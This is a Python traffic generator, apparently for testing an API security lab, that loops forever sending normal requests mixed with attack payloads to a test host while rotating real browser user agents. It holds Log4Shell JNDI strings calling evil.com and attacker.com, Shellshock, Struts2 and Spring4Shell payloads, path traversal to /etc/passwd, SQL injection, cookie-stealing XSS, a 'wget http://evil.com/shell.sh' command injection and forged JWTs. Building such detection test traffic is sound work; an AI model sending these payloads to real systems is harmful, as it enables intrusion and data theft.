import requests
import random
import time
import json
import logging
from datetime import datetime

# 設定日誌
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('traffic.log'),
        logging.StreamHandler()
    ]
)

# API 基礎 URL
BASE_URL = "http://apitest.ryantseng.work"

# 真實瀏覽器 User-Agent 列表 (模擬正常使用者)
BROWSER_USER_AGENTS = [
    # Chrome on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
    
    # Firefox on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
    
    # Chrome on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    
    # Safari on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    
    # Firefox on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
    
    # Chrome on Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    
    # Firefox on Linux
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    
    # Edge on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66",
    
    # Mobile browsers
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36"
]

def get_random_user_agent():
    """隨機選擇一個真實的瀏覽器 User-Agent"""
    return random.choice(BROWSER_USER_AGENTS)

def get_common_headers():
    """生成常見的瀏覽器標頭，模擬真實用戶行為"""
    user_agent = get_random_user_agent()
    
    # 根據 User-Agent 決定相應的 Accept 標頭
    if "Chrome" in user_agent:
        accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
    elif "Firefox" in user_agent:
        accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
    elif "Safari" in user_agent and "Chrome" not in user_agent:
        accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    else:
        accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    
    headers = {
        "User-Agent": user_agent,
        "Accept": accept,
        "Accept-Language": random.choice([
            "en-US,en;q=0.9",
            "zh-TW,zh;q=0.9,en;q=0.8",
            "zh-CN,zh;q=0.9,en;q=0.8",
            "ja-JP,ja;q=0.9,en;q=0.8",
            "ko-KR,ko;q=0.9,en;q=0.8"
        ]),
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    }
    
    # 隨機添加一些可選標頭
    if random.random() < 0.3:
        headers["Referer"] = random.choice([
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://duckduckgo.com/",
            "https://github.com/"
        ])
    
    return headers

# 測試案例
TEST_CASES = {
    "cve_attacks": [
        # CVE-2022-22965 Spring4Shell
        {
            "endpoint": "/cve/spring4shell",
            "method": "POST",
            "params": {"class.module.classLoader.resources.context.parent.pipeline.first.pattern": "test"},
            "data": {"class.module.classLoader": "malicious"}
        },
        # CVE-2021-41773 Apache Path Traversal
        {
            "endpoint": "/cve/apache/.%2e/.%2e/.%2e/.%2e/etc/passwd",
            "method": "GET"
        },
        {
            "endpoint": "/cve/apache/..%2f..%2f..%2f..%2fetc%2fpasswd",
            "method": "GET"
        },
        # CVE-2014-6271 Shellshock
        {
            "endpoint": "/cve/shellshock",
            "method": "GET",
            "headers": {
                "User-Agent": "() { :; }; /bin/bash -c 'echo vulnerable'",
                "Referer": "() { :; }; echo 'CVE-2014-6271'"
            }
        },
        # CVE-2017-5638 Struts2
        {
            "endpoint": "/cve/struts2",
            "method": "POST",
            "headers": {
                "Content-Type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].getWriter().println('vulnerable')}.multipart/form-data"
            }
        },
        # CVE-2022-21449 JWT Bypass
        {
            "endpoint": "/cve/jwt-bypass",
            "method": "POST",
            "headers": {
                "Authorization": "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.MAYCAQACAQA"
            }
        },
        # CVE-2021-44228 Log4j Enhanced
        {
            "endpoint": "/cve/log4j-enhanced/${jndi:ldap://evil.com/x}",
            "method": "GET",
            "headers": {
                "X-Api-Version": "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}"
            }
        },
        # CVE-2014-0160 Heartbleed
        {
            "endpoint": "/cve/heartbleed",
            "method": "POST",
            "data": {
                "heartbeat_length": 65535,
                "heartbeat_data": "ping"
            }
        },
        # CVE-2019-5736 Container Escape
        {
            "endpoint": "/cve/container-escape",
            "method": "POST",
            "data": {
                "cmd": "#!/proc/self/exe /bin/sh -c 'echo breakout > /host/tmp/pwned'"
            }
        }
    ],
    "basic_api": [
        {"endpoint": "/api1/user/1", "method": "GET"},
        {"endpoint": "/api1/credit-card/user1", "method": "GET"},
        {"endpoint": "/api1/payment", "method": "POST", "data": {"amount": 100}},
        {"endpoint": "/api1/debug", "method": "GET"}
    ],
    "idor_attacks": [
        {"endpoint": "/api1/user/1", "method": "GET"},
        {"endpoint": "/api1/user/2", "method": "GET"},
        {"endpoint": "/api1/user/3", "method": "GET"},
        {"endpoint": "/api1/user/999", "method": "GET"},
        {"endpoint": "/api1/user/../admin", "method": "GET"},
        {"endpoint": "/api1/credit-card/user1", "method": "GET"},
        {"endpoint": "/api1/credit-card/user2", "method": "GET"},
        {"endpoint": "/api1/credit-card/../admin", "method": "GET"}
    ],
    "injection_attacks": [
        {"endpoint": "/api8/sqli", "method": "GET", "params": {"q": "'; DROP TABLE users; --"}},
        {"endpoint": "/api8/sqli", "method": "GET", "params": {"q": "' UNION SELECT password FROM users --"}},
        {"endpoint": "/api8/sqli", "method": "GET", "params": {"q": "admin' OR '1'='1"}},
        {"endpoint": "/api8/xss", "method": "GET", "params": {"input": "<script>alert('XSS')</script>"}},
        {"endpoint": "/api8/xss", "method": "GET", "params": {"input": "javascript:alert(document.cookie)"}},
        {"endpoint": "/api8/exec", "method": "POST", "data": {"cmd": "ls -la"}},
        {"endpoint": "/api8/exec", "method": "POST", "data": {"cmd": "cat /etc/passwd"}},
        {"endpoint": "/api8/exec", "method": "POST", "data": {"cmd": "wget http://evil.com/shell.sh"}}
    ],
    "log4j_attacks": [
        {"endpoint": "/log4j/test", "method": "GET", "params": {"input": "${jndi:ldap://attacker.com/exploit}"}},
        {"endpoint": "/log4j/test", "method": "GET", "params": {"input": "${jndi:rmi://evil.com/payload}"}},
        {"endpoint": "/log4j/test", "method": "GET", "params": {"input": "${${::-j}ndi:ldap://bypass.com/a}"}},
        {"endpoint": "/log4j/test", "method": "GET", "params": {"input": "${jndi:dns://exfil.attacker.com}"}},
        {"endpoint": "/log4j/test", "method": "GET", "params": {"input": "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}"}}
    ],
    "mass_assignment": [
        {"endpoint": "/api6/profile", "method": "POST", "data": {"name": "hacker", "role": "admin", "is_premium": True}},
        {"endpoint": "/api6/user/1", "method": "PUT", "data": {"username": "pwned", "role": "admin", "permissions": ["all"]}},
        {"endpoint": "/api6/settings", "method": "PATCH", "data": {"debug": True, "admin_access": True, "rate_limit": 0}}
    ],
    "auth_bypass": [
        {"endpoint": "/api2/admin/users", "method": "GET", "headers": {"Authorization": "Bearer invalid_token"}},
        {"endpoint": "/api2/admin/users", "method": "GET", "headers": {"Authorization": "Bearer null"}},
        {"endpoint": "/api2/admin/users", "method": "GET", "headers": {"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."}},
        {"endpoint": "/api5/admin", "method": "GET"},
        {"endpoint": "/api5/users", "method": "POST", "data": {"username": "newadmin", "role": "admin"}}
    ],
    "redirect": [
        {"endpoint": "/api1/legacy/user/1", "method": "GET"},
        {"endpoint": "/api1/v1/credit-card/user1", "method": "GET"},
        {"endpoint": "/api2/v1/login", "method": "GET"},
        {"endpoint": "/api2/v1/profile", "method": "GET"},
        {"endpoint": "/api2/v1/admin", "method": "GET"}
    ],
    "pci_violation": [
        {
            "endpoint": "/api1/payment",
            "method": "POST",
            "data": {
                "card_number": "4111111111111111",
                "expiry": "12/25",
                "cvv": "123",
                "name": "John Doe"
            }
        },
        {
            "endpoint": "/api1/credit-card/user1",
            "method": "GET"
        },
        {
            "endpoint": "/api1/debug",
            "method": "GET"
        }
    ],
    "auth_tests": [
        {
            "endpoint": "/api2/token",
            "method": "POST",
            "data": {
                "username": "user1",
                "password": "user123"
            },
            "headers": {
                "X-API-Key": "user_api_key_789"
            }
        },
        {
            "endpoint": "/api2/token",
            "method": "POST",
            "data": {
                "username": "power_user",
                "password": "power123"
            },
            "headers": {
                "X-API-Key": "power_api_key_456"
            }
        },
        {
            "endpoint": "/api2/token",
            "method": "POST",
            "data": {
                "username": "admin",
                "password": "admin123"
            },
            "headers": {
                "X-API-Key": "admin_api_key_123"
            }
        }
    ],
    "protected_endpoints": [
        {
            "endpoint": "/api2/users/me",
            "method": "GET",
            "requires_auth": True
        },
        {
            "endpoint": "/api2/admin/users",
            "method": "GET",
            "requires_auth": True,
            "requires_admin": True
        },
        {
            "endpoint": "/api2/admin/stats",
            "method": "GET",
            "requires_auth": True,
            "requires_admin": True
        },
        {
            "endpoint": "/api2/power/data",
            "method": "GET",
            "requires_auth": True,
            "requires_power": True
        },
        {
            "endpoint": "/api2/user/data",
            "method": "GET",
            "requires_auth": True
        }
    ],
    "normal_user_workflow": [
        # 正常登入流程
        {
            "endpoint": "/api2/token",
            "method": "POST",
            "data": {
                "username": "user1",
                "password": "user123"
            },
            "headers": {
                "X-API-Key": "user_api_key_789"
            },
            "description": "正常用戶登入"
        },
        {
            "endpoint": "/api2/token",
            "method": "POST",
            "data": {
                "username": "power_user",
                "password": "power123"
            },
            "headers": {
                "X-API-Key": "power_api_key_456"
            },
            "description": "高級用戶登入"
        },
        # 查看個人資料
        {
            "endpoint": "/api2/users/me",
            "method": "GET",
            "requires_auth": True,
            "description": "查看個人資料"
        },
        # 查看個人資料頁面
        {
            "endpoint": "/api2/profile",
            "method": "GET",
            "requires_auth": True,
            "description": "訪問個人資料頁面"
        }
    ],
    "normal_crud_operations": [
        # 正常的用戶查詢
        {
            "endpoint": "/api1/user/1",
            "method": "GET",
            "description": "查詢用戶1資料"
        },
        {
            "endpoint": "/api1/user/2",
            "method": "GET",
            "description": "查詢用戶2資料"
        },
        {
            "endpoint": "/api1/user/3",
            "method": "GET",
            "description": "查詢用戶3資料"
        },
        # 正常的用戶列表查看
        {
            "endpoint": "/api1/admin/users",
            "method": "GET",
            "description": "查看用戶列表"
        },
        # 正常的資料查詢
        {
            "endpoint": "/api3/users",
            "method": "GET",
            "description": "查詢用戶列表"
        },
        {
            "endpoint": "/api3/data",
            "method": "GET",
            "description": "查詢一般資料"
        },
        # 正常的個人資料更新
        {
            "endpoint": "/api6/profile",
            "method": "POST",
            "data": {
                "name": "John Doe",
                "email": "john@example.com",
                "phone": "123-456-7890"
            },
            "description": "更新個人資料"
        },
        # 正常的用戶資料更新
        {
            "endpoint": "/api6/user/1",
            "method": "PUT",
            "data": {
                "username": "john_doe",
                "email": "john.doe@company.com"
            },
            "description": "更新用戶資料"
        }
    ],
    "browsing_and_search": [
        # 正常瀏覽行為
        {
            "endpoint": "/",
            "method": "GET",
            "description": "訪問首頁"
        },
        {
            "endpoint": "/docs",
            "method": "GET",
            "description": "查看API文件"
        },
        {
            "endpoint": "/openapi.json",
            "method": "GET",
            "description": "獲取OpenAPI規格"
        },
        # API 端點探索
        {
            "endpoint": "/api1/",
            "method": "GET",
            "description": "探索API1端點"
        },
        {
            "endpoint": "/api2/",
            "method": "GET",
            "description": "探索API2端點"
        },
        {
            "endpoint": "/cve/",
            "method": "GET",
            "description": "查看CVE測試端點"
        },
        # 正常的搜尋和查詢
        {
            "endpoint": "/api8/sqli",
            "method": "GET",
            "params": {"q": "john"},
            "description": "正常用戶搜尋"
        },
        {
            "endpoint": "/api8/sqli",
            "method": "GET",
            "params": {"q": "admin"},
            "description": "搜尋管理員"
        },
        {
            "endpoint": "/api8/sqli",
            "method": "GET",
            "params": {"q": "user"},
            "description": "搜尋一般用戶"
        }
    ],
    "system_operations": [
        # 系統狀態和健康檢查
        {
            "endpoint": "/",
            "method": "GET",
            "description": "系統狀態檢查"
        },
        # 版本和配置查詢
        {
            "endpoint": "/api7/version",
            "method": "GET",
            "description": "查詢系統版本"
        },
        # 正常的設定查詢
        {
            "endpoint": "/api6/settings",
            "method": "PATCH",
            "data": {
                "theme": "dark",
                "language": "zh-TW",
                "notifications": True
            },
            "description": "更新用戶設定"
        },
        # 正常的統計資料查看 (需要權限)
        {
            "endpoint": "/api2/admin/stats",
            "method": "GET",
            "requires_auth": True,
            "requires_admin": True,
            "description": "查看系統統計"
        },
        # 密碼變更
        {
            "endpoint": "/api10/password",
            "method": "PUT",
            "data": {
                "old_password": "user123",
                "new_password": "newpass456"
            },
            "description": "更改密碼"
        },
        # 正常登出 (模擬)
        {
            "endpoint": "/api10/login",
            "method": "POST",
            "data": {
                "action": "logout"
            },
            "description": "用戶登出"
        }
    ]
}

# 用戶認證資訊
AUTH_INFO = {
    "user1": {
        "username": "user1",
        "password": "user123",
        "api_key": "user_api_key_789"
    },
    "power_user": {
        "username": "power_user",
        "password": "power123",
        "api_key": "power_api_key_456"
    },
    "admin": {
        "username": "admin",
        "password": "admin123",
        "api_key": "admin_api_key_123"
    }
}

# 儲存 token
tokens = {}

def get_token(user_type):
    if user_type in tokens:
        return tokens[user_type]
    
    auth = AUTH_INFO[user_type]
    response = requests.post(
        f"{BASE_URL}/api2/token",
        data={
            "username": auth["username"],
            "password": auth["password"]
        },
        headers={
            "X-API-Key": auth["api_key"]
        }
    )
    
    if response.status_code == 200:
        token_data = response.json()
        tokens[user_type] = token_data["access_token"]
        return tokens[user_type]
    return None

def run_basic_test(test_case):
    try:
        method = test_case["method"]
        endpoint = test_case["endpoint"]
        data = test_case.get("data", {})
        headers = get_common_headers()
        
        response = requests.request(
            method,
            f"{BASE_URL}{endpoint}",
            json=data if method == "POST" else None,
            params=data if method == "GET" else None,
            headers=headers,
            allow_redirects=False
        )
        
        logging.info(f"Basic API Test - {method} {endpoint}: {response.status_code}")
        if response.status_code == 301:
            logging.info(f"Redirect to: {response.headers.get('Location')}")
        return response
    except Exception as e:
        logging.error(f"Basic API Test Error - {endpoint}: {str(e)}")
        return None

def run_redirect_test(test_case):
    try:
        method = test_case["method"]
        endpoint = test_case["endpoint"]
        headers = get_common_headers()
        
        response = requests.request(
            method,
            f"{BASE_URL}{endpoint}",
            headers=headers,
            allow_redirects=False
        )
        
        logging.info(f"Redirect Test - {method} {endpoint}: {response.status_code}")
        if response.status_code == 301:
            logging.info(f"Redirect to: {response.headers.get('Location')}")
        return response
    except Exception as e:
        logging.error(f"Redirect Test Error - {endpoint}: {str(e)}")
        return None

def run_pci_test(test_case):
    try:
        method = test_case["method"]
        endpoint = test_case["endpoint"]
        data = test_case.get("data", {})
        headers = get_common_headers()
        
        response = requests.request(
            method,
            f"{BASE_URL}{endpoint}",
            json=data if method == "POST" else None,
            params=data if method == "GET" else None,
            headers=headers
        )
        
        logging.info(f"PCI Test - {method} {endpoint}: {response.status_code}")
        
        # 檢查是否洩露敏感資訊
        if response.status_code == 200:
            try:
                content = response.json()
                if "card_number" in str(content) or "cvv" in str(content):
                    logging.warning(f"PCI Violation Detected - Sensitive data exposed in {endpoint}")
            except:
                pass
        return response
    except Exception as e:
        logging.error(f"PCI Test Error - {endpoint}: {str(e)}")
        return None

def run_auth_test(test_case):
    try:
        method = test_case["method"]
        endpoint = test_case["endpoint"]
        data = test_case.get("data", {})
        headers = get_common_headers()
        
        # 合併測試案例中的特定標頭
        test_headers = test_case.get("headers", {})
        headers.update(test_headers)
        
        response = requests.request(
            method,
            f"{BASE_URL}{endpoint}",
            data=data,
            headers=headers
        )
        
        logging.info(f"Auth Test - {method} {endpoint}: {response.status_code}")
        if response.status_code == 200:
            logging.info("Authentication successful")
        return response
    except Exception as e:
        logging.error(f"Auth Test Error - {endpoint}: {str(e)}")
        return None

def run_protected_test(test_case):
    try:
        method = test_case["method"]
        endpoint = test_case["endpoint"]
        requires_admin = test_case.get("requires_admin", False)
        requires_power = test_case.get("requires_power", False)
        
        # 選擇適當的用戶類型
        if requires_admin:
            user_type = "admin"
        elif requires_power:
            user_type = "power_user"
        else:
            user_type = "user1"
        
        # 獲取 token
        token = get_token(user_type)
        if not token:
            logging.error(f"Failed to get token for {user_type}")
            return None
        
        # 獲取 API Key
        api_key = AUTH_INFO[user_type]["api_key"]
        
        headers = {
            "Authorization": f"Bearer {token}",
            "X-API-Key": api_key
        }
        
        response = requests.request(
            method,
            f"{BASE_URL}{endpoint}",
            headers=headers
        )
        
        logging.info(f"Protected Endpoint Test - {method} {endpoint} as {user_type}: {response.status_code}")
        return response
    except Exception as e:
        logging.error(f"Protected Endpoint Test Error - {endpoint}: {str(e)}")
        return None

def run_idor_test(test_case):
    """Test for Insecure Direct Object Reference vulnerabilities"""
    try:
        method = test_case["method"]
        endpoint = test_case["endpoint"]
        
        response = requests.request(
            method,
            f"{BASE_URL}{endpoint}",
            allow_redirects=False
        )
        
        logging.info(f"IDOR Test - {method} {endpoint}: {response.status_code}")
        
        # Check for potential IDOR success indicators
        if response.status_code == 200:
            try:
                content = response.json()
                if "credit_card" in str(content).lower() or "password" in str(content).lower():
                    logging.warning(f"IDOR Vulnerability Detected - Sensitive data exposed in {endpoint}")
            except:
                pass
        return response
    except Exception as e:
        logging.error(f"IDOR Test Error - {endpoint}: {str(e)}")
        return None

def run_injection_test(test_case):
    """Test for various injection vulnerabilities"""
    try:
        method = test_case["method"]
        endpoint = test_case["endpoint"]
        data = test_case.get("data", {})
        params = test_case.get("params", {})
        headers = get_common_headers()
        
        response = requests.request(
            method,
            f"{BASE_URL}{endpoint}",
            json=data if method == "POST" else None,
            params=params if params else None,
            headers=headers
        )
        
        logging.info(f"Injection Test - {method} {endpoint}: {response.status_code}")
        
        # Check for potential injection success indicators
        if response.status_code == 200:
            try:
                content = response.text.lower()
                if any(indicator in content for indicator in ["error", "exception", "syntax", "mysql", "postgresql"]):
                    logging.warning(f"Potential Injection Vulnerability - Error response from {endpoint}")
            except:
                pass
        return response
    except Exception as e:
        logging.error(f"Injection Test Error - {endpoint}: {str(e)}")
        return None

def run_log4j_test(test_case):
    """Test for Log4j/Log4Shell vulnerabilities"""
    try:
        method = test_case["method"]
        endpoint = test_case["endpoint"]
        params = test_case.get("params", {})
        
        # 使用真實瀏覽器標頭但加入 Log4j 攻擊載荷
        headers = get_common_headers()
        
        # 在隨機標頭中注入 Log4j 載荷，模擬真實攻擊
        log4j_payloads = [
            "${jndi:ldap://log4j-scanner.attacker.com/ua}",
            "${jndi:rmi://log4j-test.evil.com/exploit}",
            "${${::-j}ndi:ldap://obfuscated.attacker.com/a}"
        ]
        payload = random.choice(log4j_payloads)
        
        # 隨機選擇一個標頭來放置攻擊載荷
        attack_headers = ["X-Forwarded-For", "X-Real-IP", "Referer", "X-Api-Version"]
        attack_header = random.choice(attack_headers)
        headers[attack_header] = payload
        
        response = requests.request(
            method,
            f"{BASE_URL}{endpoint}",
            params=params,
            headers=headers
        )
        
        logging.info(f"Log4j Test - {method} {endpoint}: {response.status_code}")
        logging.info(f"Log4j Payload in {attack_header}: {payload}")
        return response
    except Exception as e:
        logging.error(f"Log4j Test Error - {endpoint}: {str(e)}")
        return None

def run_mass_assignment_test(test_case):
    """Test for Mass Assignment vulnerabilities"""
    try:
        method = test_case["method"]
        endpoint = test_case["endpoint"]
        data = test_case.get("data", {})
        headers = get_common_headers()
        
        response = requests.request(
            method,
            f"{BASE_URL}{endpoint}",
            json=data,
            headers=headers
        )
        
        logging.info(f"Mass Assignment Test - {method} {endpoint}: {response.status_code}")
        
        # Check if dangerous fields were accepted
        if response.status_code == 200:
            try:
                content = response.json()
                dangerous_fields = ["role", "admin", "permissions", "is_admin", "debug"]
                if any(field in str(content).lower() for field in dangerous_fields):
                    logging.warning(f"Mass Assignment Vulnerability - Dangerous fields accepted in {endpoint}")
            except:
                pass
        return response
    except Exception as e:
        logging.error(f"Mass Assignment Test Error - {endpoint}: {str(e)}")
        return None

def run_auth_bypass_test(test_case):
    """Test for Authentication Bypass vulnerabilities"""
    try:
        method = test_case["method"]
        endpoint = test_case["endpoint"]
        data = test_case.get("data", {})
        browser_headers = get_common_headers()
        
        # 合併測試案例中的特定標頭
        test_headers = test_case.get("headers", {})
        browser_headers.update(test_headers)
        
        response = requests.request(
            method,
            f"{BASE_URL}{endpoint}",
            json=data if data else None,
            headers=browser_headers
        )
        
        logging.info(f"Auth Bypass Test - {method} {endpoint}: {response.status_code}")
        
        # Check for successful bypass (200 when should be 401/403)
        if response.status_code == 200:
            logging.warning(f"Potential Auth Bypass - Unauthorized access granted to {endpoint}")
        return response
    except Exception as e:
        logging.error(f"Auth Bypass Test Error - {endpoint}: {str(e)}")
        return None

def run_cve_test(test_case):
    """Test for real CVE vulnerabilities"""
    try:
        method = test_case["method"]
        endpoint = test_case["endpoint"]
        data = test_case.get("data", {})
        params = test_case.get("params", {})
        browser_headers = get_common_headers()
        
        # 合併測試案例中的特定標頭（攻擊載荷）
        test_headers = test_case.get("headers", {})
        browser_headers.update(test_headers)
        
        response = requests.request(
            method,
            f"{BASE_URL}{endpoint}",
            json=data if method in ["POST", "PUT", "PATCH"] else None,
            params=params if params else None,
            headers=browser_headers,
            allow_redirects=False
        )
        
        logging.info(f"CVE Test - {method} {endpoint}: {response.status_code}")
        
        # Check for vulnerability detection
        if response.status_code == 200:
            try:
                content = response.json()
                if content.get("vulnerable", False):
                    cve = content.get("cve", "Unknown")
                    severity = content.get("severity", "Unknown")
                    logging.warning(f"CVE DETECTED - {cve} ({severity}): {content.get('message', '')}")
            except:
                # Check text response for path traversal
                try:
                    text_content = response.text
                    if "root:x:0:0" in text_content or "[fonts]" in text_content:
                        logging.warning(f"CVE DETECTED - Path Traversal successful on {endpoint}")
                except:
                    pass
        return response
    except Exception as e:
        logging.error(f"CVE Test Error - {endpoint}: {str(e)}")
        return None

def run_normal_workflow_test(test_case):
    """Test for normal user workflow operations"""
    try:
        method = test_case["method"]
        endpoint = test_case["endpoint"]
        data = test_case.get("data", {})
        headers = get_common_headers()
        description = test_case.get("description", "Normal workflow")
        
        # 合併測試案例中的特定標頭
        test_headers = test_case.get("headers", {})
        headers.update(test_headers)
        
        # 處理需要認證的請求
        if test_case.get("requires_auth", False):
            requires_admin = test_case.get("requires_admin", False)
            requires_power = test_case.get("requires_power", False)
            
            if requires_admin:
                user_type = "admin"
            elif requires_power:
                user_type = "power_user"
            else:
                user_type = "user1"
            
            token = get_token(user_type)
            if token:
                headers["Authorization"] = f"Bearer {token}"
                headers["X-API-Key"] = AUTH_INFO[user_type]["api_key"]
        
        response = requests.request(
            method,
            f"{BASE_URL}{endpoint}",
            json=data if method in ["POST", "PUT", "PATCH"] else None,
            data=data if method == "POST" and "token" in endpoint else None,
            headers=headers
        )
        
        logging.info(f"Normal Workflow - {description}: {method} {endpoint} -> {response.status_code}")
        return response
    except Exception as e:
        logging.error(f"Normal Workflow Error - {endpoint}: {str(e)}")
        return None

def run_normal_crud_test(test_case):
    """Test for normal CRUD operations"""
    try:
        method = test_case["method"]
        endpoint = test_case["endpoint"]
        data = test_case.get("data", {})
        headers = get_common_headers()
        description = test_case.get("description", "Normal CRUD")
        
        response = requests.request(
            method,
            f"{BASE_URL}{endpoint}",
            json=data if method in ["POST", "PUT", "PATCH"] else None,
            headers=headers
        )
        
        logging.info(f"Normal CRUD - {description}: {method} {endpoint} -> {response.status_code}")
        return response
    except Exception as e:
        logging.error(f"Normal CRUD Error - {endpoint}: {str(e)}")
        return None

def run_browsing_test(test_case):
    """Test for normal browsing and search operations"""
    try:
        method = test_case["method"]
        endpoint = test_case["endpoint"]
        params = test_case.get("params", {})
        headers = get_common_headers()
        description = test_case.get("description", "Normal browsing")
        
        response = requests.request(
            method,
            f"{BASE_URL}{endpoint}",
            params=params if params else None,
            headers=headers
        )
        
        logging.info(f"Normal Browsing - {description}: {method} {endpoint} -> {response.status_code}")
        return response
    except Exception as e:
        logging.error(f"Normal Browsing Error - {endpoint}: {str(e)}")
        return None

def run_system_ops_test(test_case):
    """Test for normal system operations"""
    try:
        method = test_case["method"]
        endpoint = test_case["endpoint"]
        data = test_case.get("data", {})
        headers = get_common_headers()
        description = test_case.get("description", "System operation")
        
        # 處理需要認證的請求
        if test_case.get("requires_auth", False):
            requires_admin = test_case.get("requires_admin", False)
            requires_power = test_case.get("requires_power", False)
            
            if requires_admin:
                user_type = "admin"
            elif requires_power:
                user_type = "power_user"
            else:
                user_type = "user1"
            
            token = get_token(user_type)
            if token:
                headers["Authorization"] = f"Bearer {token}"
                headers["X-API-Key"] = AUTH_INFO[user_type]["api_key"]
        
        response = requests.request(
            method,
            f"{BASE_URL}{endpoint}",
            json=data if method in ["POST", "PUT", "PATCH"] else None,
            headers=headers
        )
        
        logging.info(f"System Ops - {description}: {method} {endpoint} -> {response.status_code}")
        return response
    except Exception as e:
        logging.error(f"System Ops Error - {endpoint}: {str(e)}")
        return None

def main():
    logging.info("Starting Enhanced API Security Traffic Generator")
    
    while True:
        # 隨機選擇 2-3 種測試類型進行更全面的測試
        num_tests = random.randint(2, 3)
        test_types = random.sample(list(TEST_CASES.keys()), num_tests)
        
        for test_type in test_types:
            test_cases = TEST_CASES[test_type]
            test_case = random.choice(test_cases)
            
            # Route to appropriate test function
            if test_type == "basic_api":
                run_basic_test(test_case)
            elif test_type == "redirect":
                run_redirect_test(test_case)
            elif test_type == "pci_violation":
                run_pci_test(test_case)
            elif test_type == "auth_tests":
                run_auth_test(test_case)
            elif test_type == "protected_endpoints":
                run_protected_test(test_case)
            elif test_type == "idor_attacks":
                run_idor_test(test_case)
            elif test_type == "injection_attacks":
                run_injection_test(test_case)
            elif test_type == "log4j_attacks":
                run_log4j_test(test_case)
            elif test_type == "mass_assignment":
                run_mass_assignment_test(test_case)
            elif test_type == "auth_bypass":
                run_auth_bypass_test(test_case)
            elif test_type == "cve_attacks":
                run_cve_test(test_case)
            elif test_type == "normal_user_workflow":
                run_normal_workflow_test(test_case)
            elif test_type == "normal_crud_operations":
                run_normal_crud_test(test_case)
            elif test_type == "browsing_and_search":
                run_browsing_test(test_case)
            elif test_type == "system_operations":
                run_system_ops_test(test_case)
            
            # 在請求之間添加隨機延遲 (模擬真實攻擊行為)
            time.sleep(random.uniform(0.5, 2.0))
        
        # 每輪測試後等待 (避免過於頻繁的請求)
        time.sleep(random.uniform(3, 7))

if __name__ == "__main__":
    main() 